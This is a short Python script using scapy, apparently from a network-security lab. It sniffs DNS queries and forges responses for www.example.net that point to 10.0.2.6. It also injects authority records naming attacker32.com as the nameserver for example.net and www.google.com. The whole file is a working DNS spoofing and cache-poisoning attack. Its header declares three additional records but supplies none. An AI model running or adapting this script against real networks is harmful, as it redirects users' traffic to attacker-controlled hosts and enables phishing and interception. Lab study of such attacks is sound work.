#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
	if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):

		# Swap the source and destination IP address
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

		# Swap the source and destination port number
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
				ttl=259200, rdata='10.0.2.6')

		# The Authority Section
		NSsec1 = DNSRR(rrname='example.net', type='NS',
				ttl=259200, rdata='attacker32.com')
		NSsec2 = DNSRR(rrname='www.google.com', type='NS',
				ttl=259200, rdata='attacker32.com')

		# Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, 
				qdcount=1, ancount=1, nscount=2, arcount=3,
				an=Anssec, ns=NSsec1/NSsec2)

		# Construct the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
